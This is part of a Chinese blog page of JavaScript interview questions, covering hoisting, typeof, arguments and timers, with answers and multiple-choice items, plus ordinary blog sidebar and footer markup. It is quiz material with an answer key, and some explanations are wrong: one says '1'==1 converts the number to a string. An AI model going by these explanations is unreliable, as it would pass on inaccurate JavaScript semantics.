+<h2 id="数组和字符串"><a href="#数组和字符串" class="headerlink" title="数组和字符串"></a>数组和字符串</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outPut</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.writeln(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"lashou"</span>;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">outPut(b);</span><br><span class="line">a = <span class="string">"拉手"</span>;</span><br><span class="line">outPut(a);</span><br><span class="line">outPut(b);</span><br><span class="line"><span class="keyword">var</span> a_array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b_array = a_array;</span><br><span class="line">outPut(b_array);</span><br><span class="line">a_array[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">outPut(a_array);</span><br><span class="line">outPut(b_array);</span><br></pre></td></tr></table></figure>
+<p>输出结果：lashou 拉手 lashou 1,2,3 1,2,3,4 1,2,3,4</p>
+<h2 id="下列控制台都输出什么"><a href="#下列控制台都输出什么" class="headerlink" title="下列控制台都输出什么"></a>下列控制台都输出什么</h2><p>第1题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function setName()&#123;</span><br><span class="line">  name=&quot;张三&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setName();</span><br><span class="line">console.log(name); // 答案：&quot;张三&quot;</span><br></pre></td></tr></table></figure>
+<p>第2题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//考点：1、变量声明提升 2、变量搜索机制</span><br><span class="line">var a=1;</span><br><span class="line">function test()&#123;</span><br><span class="line">  console.log(a); // 答案：undefined</span><br><span class="line">  var a=1;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>
+<p>第3题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var b=2;</span><br><span class="line">function test2()&#123;</span><br><span class="line">  window.b=3;</span><br><span class="line">  console.log(b); // 答案：3</span><br><span class="line">&#125;</span><br><span class="line">test2();</span><br></pre></td></tr></table></figure>
+<p>第4题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=5;//声明一个全局变量c </span><br><span class="line">function test3()&#123;</span><br><span class="line">  window.c=3;</span><br><span class="line">  console.log(c);   //答案：undefined，原因：由于此时的c是一个局部变量c，并且没有被赋值</span><br><span class="line">  var c;</span><br><span class="line">  console.log(window.c);//答案：3，原因：这里的c就是一个全局变量c</span><br><span class="line">&#125;</span><br><span class="line">test3();</span><br></pre></td></tr></table></figure>
+<p>第5题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var arr = [];</span><br><span class="line">arr[0]  = &apos;a&apos;;</span><br><span class="line">arr[1]  = &apos;b&apos;;</span><br><span class="line">arr[10] = &apos;c&apos;;</span><br><span class="line">alert(arr.length);  //答案：11</span><br><span class="line">console.log(arr[5]);  //答案：undefined</span><br></pre></td></tr></table></figure>
+<p>第6题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a=1;</span><br><span class="line">console.log(a++);   //答案：1</span><br><span class="line">console.log(++a);   //答案：3</span><br></pre></td></tr></table></figure>
+<p>第7题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(null==undefined); //答案：true</span><br><span class="line">console.log(&quot;1&quot;==1);    //答案：true，因为会将数字1先转换为字符串1</span><br><span class="line">console.log(&quot;1&quot;===1);   //答案：false，因为数据类型不一致</span><br></pre></td></tr></table></figure>
+<p>第8题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typeof 1;   &quot;number&quot;</span><br><span class="line">typeof &quot;hello&quot;;   &quot;string&quot;</span><br><span class="line">typeof /[0-9]/;   &quot;object&quot;</span><br><span class="line">typeof &#123;&#125;;    &quot;object&quot;</span><br><span class="line">typeof null;    &quot;object&quot;</span><br><span class="line">typeof undefined; &quot;undefined&quot;</span><br><span class="line">typeof [1,2,3];   &quot;object&quot;</span><br><span class="line">typeof function()&#123;&#125;;  //&quot;function&quot;</span><br></pre></td></tr></table></figure>
+<p>第9题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parseInt(3.14);     //3</span><br><span class="line">parseFloat(&quot;3asdf&quot;);    //3</span><br><span class="line">parseInt(&quot;1.23abc456&quot;);</span><br><span class="line">parseInt(true);//&quot;true&quot; NaN</span><br></pre></td></tr></table></figure>
+<p>第10题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//考点：函数声明提前</span><br><span class="line">function bar() &#123;</span><br><span class="line">    return foo;</span><br><span class="line">    foo = 10;</span><br><span class="line">    function foo() &#123;&#125;</span><br><span class="line">    //var foo = 11;</span><br><span class="line">&#125;</span><br><span class="line">alert(typeof bar());//&quot;function&quot;</span><br></pre></td></tr></table></figure>
+<p>第11题：考点：函数声明提前</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var foo = 1;</span><br><span class="line">function bar() &#123;</span><br><span class="line">  foo = 10;</span><br><span class="line">  return;</span><br><span class="line">  function foo() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">alert(foo);// 1</span><br></pre></td></tr></table></figure>
+<p>第12题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.log(a);//是一个函数</span><br><span class="line">var a = 3;</span><br><span class="line">function a()&#123;&#125;</span><br><span class="line">console.log(a);////3</span><br></pre></td></tr></table></figure>
+<p>第13题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//考点：对arguments的操作</span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    arguments[0] = 2;</span><br><span class="line">    alert(a);//答案：2，因为：a、arguments是对实参的访问，b、通过arguments[i]可以修改指定实参的值</span><br><span class="line">&#125;</span><br><span class="line">foo(1);</span><br></pre></td></tr></table></figure>
+<p>第14题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">  alert(arguments.length);//答案：3，因为arguments是对实参的访问</span><br><span class="line">&#125;</span><br><span class="line">foo(1, 2, 3);</span><br></pre></td></tr></table></figure>
+<p>第15题:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bar();//报错</span><br><span class="line">var foo = function bar(name) &#123;</span><br><span class="line">  console.log(&quot;hello&quot;+name);</span><br><span class="line">  console.log(bar);</span><br><span class="line">&#125;;</span><br><span class="line">//alert(typeof bar);</span><br><span class="line">foo(&quot;world&quot;);//&quot;hello&quot;</span><br><span class="line">console.log(bar);//undefined</span><br><span class="line">console.log(foo.toString());</span><br><span class="line">bar();//报错</span><br></pre></td></tr></table></figure>
+<p>第16题：以下执行会有什么输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">  console.log(&quot;test函数&quot;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">  console.log(&quot;定时器回调函数&quot;);</span><br><span class="line">&#125;, 0)</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p>test函数<br>定时器回调函数</p>
+<h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p><strong>以下哪些是javascript的全局函数：( ABC )</strong></p>
+<p>A. escape 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。ECMAScript v3 反对使用该方法，应用使用 decodeURI() 和 decodeURIComponent() 替代它。<br>B. parseFloat parseFloat() 函数可解析一个字符串，并返回一个浮点数。该函数指定字符串中的首个字符是否是数字。如果是，则对字符串进行解析，直到到达数字的末端为止，然后以数字返回该数字，而不是作为字符串。<br>C. eval 函数可计算某个字符串，并执行其中的的 JavaScript 代码。<br>D. setTimeout<br>E. alert</p>
+<p><strong>关于IE的window对象表述正确的有：( ACD )</strong></p>
+<p>A. window.opener属性本身就是指向window对象<br>B. window.reload()方法可以用来刷新当前页面 应该是location.reload或者window.location.reload<br>C. window.location=”a.html”和window.location.href=”a.html”的作用都是把当前页面替换成a.html页面<br>D. 定义了全局变量g；可以用window.g的方式来存取该变量</p>
+<p><strong>下面正确的是 ( A )</strong></p>
+<p>A: 跨域问题能通过JsonP方案解决<br>B：不同子域名间仅能通过修改window.name解决跨域还可以通过script标签src，jsonp等h5 Java split等<br>C：只有在IE中可通过iframe嵌套跨域<br>D：MediaQuery属性是进行视频格式检测的属性是做响应式的</p>
+<p><strong>错误的是 ( B )</strong></p>
+<p>A: Ajax本质是XMLHttpRequest<br>B: 块元素实际占用的宽度与它的width、border、padding属性有关，与background无关<br>C: position属性absolute、fixed、—relative—会使文档脱标<br>D: float属性left也会使div脱标</p>
+<p>感谢您的支持！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>感谢您的支持！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="honey young 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="honey young 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/js/" rel="tag"><i class="fa fa-tag"></i> js</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/04/28/题库-js篇（上）/" rel="next" title="题库-js篇(上)">
+                <i class="fa fa-chevron-left"></i> 题库-js篇(上)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/23/个人标签/" rel="prev" title="个人技能">
+                个人技能 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            博文目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概要
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="honey young" />
+            
+              <p class="site-author-name" itemprop="name">honey young</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">71</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/honeyYoung/honeyyoung.github.io" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/de13fcfe3889" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/dong-gua-xiao-ke-ai/activities" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-globe"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#正则表达式"><span class="nav-number">1.</span> <span class="nav-text">正则表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串"><span class="nav-number">1.1.</span> <span class="nav-text">写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写出正确的正则表达式匹配固话号"><span class="nav-number">1.2.</span> <span class="nav-text">写出正确的正则表达式匹配固话号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成"><span class="nav-number">1.3.</span> <span class="nav-text">要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出结果是"><span class="nav-number">2.</span> <span class="nav-text">输出结果是</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#声明对象，添加属性，输出属性"><span class="nav-number">3.</span> <span class="nav-text">声明对象，添加属性，输出属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#匹配输入的字符：第一个必须是字母或下划线开头，长度5-20"><span class="nav-number">4.</span> <span class="nav-text">匹配输入的字符：第一个必须是字母或下划线开头，长度5-20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检测变量类型"><span class="nav-number">5.</span> <span class="nav-text">检测变量类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何在HTML中添加事件"><span class="nav-number">6.</span> <span class="nav-text">如何在HTML中添加事件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BOM对象有哪些，列举window对象"><span class="nav-number">7.</span> <span class="nav-text">BOM对象有哪些，列举window对象</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码实现-outerHTML"><span class="nav-number">8.</span> <span class="nav-text">代码实现 outerHTML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JS中的简单继承-call方法！"><span class="nav-number">9.</span> <span class="nav-text">JS中的简单继承 call方法！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bind-live-delegate-的区别"><span class="nav-number">10.</span> <span class="nav-text">bind(), live(), delegate()的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何优化自己的代码"><span class="nav-number">11.</span> <span class="nav-text">如何优化自己的代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#怎样实现两栏等高"><span class="nav-number">12.</span> <span class="nav-text">怎样实现两栏等高</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用js实现这样的效果"><span class="nav-number">13.</span> <span class="nav-text">使用js实现这样的效果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#以下代码中end字符串什么时候输出"><span class="nav-number">14.</span> <span class="nav-text">以下代码中end字符串什么时候输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现specify函数"><span class="nav-number">15.</span> <span class="nav-text">实现specify函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简述-readyonly-与-disabled-的区别"><span class="nav-number">16.</span> <span class="nav-text">简述 readyonly 与 disabled 的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解释ajax的工作原理"><span class="nav-number">17.</span> <span class="nav-text">解释ajax的工作原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为什么扩展javascript内置对象不是好的做法？"><span class="nav-number">18.</span> <span class="nav-text">为什么扩展javascript内置对象不是好的做法？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是三元表达式？"><span class="nav-number">19.</span> <span class="nav-text">什么是三元表达式？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP协议中，GET和POST有什么区别？分别适用什么场景-？"><span class="nav-number">20.</span> <span class="nav-text">HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP状态消息200-302-304-403-404-500分别表示什么"><span class="nav-number">21.</span> <span class="nav-text">HTTP状态消息200 302 304 403 404 500分别表示什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP协议中，header-信息里面，怎么控制页面失效时间（last-modified-cache-control-Expires分别代表什么）"><span class="nav-number">22.</span> <span class="nav-text">HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#业界常用的优化-WEB-页面加载速度的方法（可以分别从页面元素展现，请求连接，css-js-服务器等方面介绍）"><span class="nav-number">23.</span> <span class="nav-text">业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列举常用的-web-页面开发，调试以及优化工具"><span class="nav-number">24.</span> <span class="nav-text">列举常用的 web 页面开发，调试以及优化工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解释什么是sql注入，xss漏洞"><span class="nav-number">25.</span> <span class="nav-text">解释什么是sql注入，xss漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请列举js数组类型中的常用方法"><span class="nav-number">26.</span> <span class="nav-text">请列举js数组类型中的常用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ECMAScript-6-中数组新方法"><span class="nav-number">27.</span> <span class="nav-text">ECMAScript 6 中数组新方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素"><span class="nav-number">28.</span> <span class="nav-text">FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列举常用的js框架以及分别适用的领域"><span class="nav-number">29.</span> <span class="nav-text">列举常用的js框架以及分别适用的领域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js中如何实现一个map"><span class="nav-number">30.</span> <span class="nav-text">js中如何实现一个map</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js可否实现面向对象编程，如果可以如何实现js对象的继承"><span class="nav-number">31.</span> <span class="nav-text">js可否实现面向对象编程，如果可以如何实现js对象的继承</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#变量的命名规范以及命名推荐"><span class="nav-number">32.</span> <span class="nav-text">变量的命名规范以及命名推荐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三种弹窗的单词以及三种弹窗的功能"><span class="nav-number">33.</span> <span class="nav-text">三种弹窗的单词以及三种弹窗的功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出值是"><span class="nav-number">34.</span> <span class="nav-text">输出值是</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#求一个函数-y-f-x-a-b"><span class="nav-number">35.</span> <span class="nav-text">求一个函数 y = f(x, a, b);</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript-alert-0-4-0-2-结果是多少-如何处理"><span class="nav-number">36.</span> <span class="nav-text">JavaScript alert(0.4*0.2); 结果是多少? 如何处理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一个div，有几种方式得到这个-div-的-jQuery-对象？"><span class="nav-number">37.</span> <span class="nav-text">一个div，有几种方式得到这个 div 的 jQuery 对象？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jQuery-框架中-ajax-的常用参数有哪些"><span class="nav-number">38.</span> <span class="nav-text">jQuery 框架中 $.ajax()的常用参数有哪些</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#闭包"><span class="nav-number">39.</span> <span class="nav-text">闭包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列出3条以上-ff-和-IE-的脚本兼容问题"><span class="nav-number">40.</span> <span class="nav-text">列出3条以上 ff 和 IE 的脚本兼容问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个"><span class="nav-number">41.</span> <span class="nav-text">列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"><span class="nav-number">42.</span> <span class="nav-text">在Javascript中什么是伪数组？如何将伪数组转化为标准数组？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写一个函数可以计算-sum-5-0-5-输出0-sum-1-2-3-4-输出10"><span class="nav-number">43.</span> <span class="nav-text">写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#算法"><span class="nav-number">44.</span> <span class="nav-text">算法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请写出一个程序"><span class="nav-number">45.</span> <span class="nav-text">请写出一个程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24"><span class="nav-number">46.</span> <span class="nav-text">用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前端代码优化的方法"><span class="nav-number">47.</span> <span class="nav-text">前端代码优化的方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下列JavaScript代码执行后，依次alert的结果是"><span class="nav-number">48.</span> <span class="nav-text">下列JavaScript代码执行后，依次alert的结果是</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下列JavaScript代码执行后，iNum的值是"><span class="nav-number">49.</span> <span class="nav-text">下列JavaScript代码执行后，iNum的值是</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输出结果是多少"><span class="nav-number">50.</span> <span class="nav-text">输出结果是多少</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下列JavaScript代码执行后，运行的结果是"><span class="nav-number">51.</span> <span class="nav-text">下列JavaScript代码执行后，运行的结果是</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下列JavaScript代码执行后，依次-alert-的结果"><span class="nav-number">52.</span> <span class="nav-text">下列JavaScript代码执行后，依次 alert 的结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下列JavaScript代码执行后的效果是"><span class="nav-number">53.</span> <span class="nav-text">下列JavaScript代码执行后的效果是</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下列JavaScript代码执行后的-li-元素的数量是"><span class="nav-number">54.</span> <span class="nav-text">下列JavaScript代码执行后的 li 元素的数量是</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序中捕获异常的方法"><span class="nav-number">55.</span> <span class="nav-text">程序中捕获异常的方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原型对象上添加方法"><span class="nav-number">56.</span> <span class="nav-text">原型对象上添加方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数组和字符串"><span class="nav-number">57.</span> <span class="nav-text">数组和字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下列控制台都输出什么"><span class="nav-number">58.</span> <span class="nav-text">下列控制台都输出什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#选择题"><span class="nav-number">59.</span> <span class="nav-text">选择题</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">honey young</span>
+
+  
+</div>
+
+
+  <div class="powered-by">
+     <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+      本站访客数:<span id="busuanzi_value_site_uv"></span>
+     </span>
+  </div>
+<!-- <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div> 
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+-->
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
